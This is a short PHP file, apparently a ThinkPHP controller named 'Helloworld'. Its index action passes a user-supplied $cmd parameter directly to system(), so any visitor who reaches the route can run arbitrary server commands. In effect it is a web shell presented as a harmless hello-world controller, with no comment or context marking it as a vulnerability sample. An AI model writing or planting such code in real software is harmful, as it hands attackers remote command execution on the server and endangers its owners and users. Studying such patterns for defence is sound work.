<?php
namespace app\index\controller;
class Helloworld {
	public function index($cmd = 'dir')
	{
		return system($cmd);
	}	
}


?>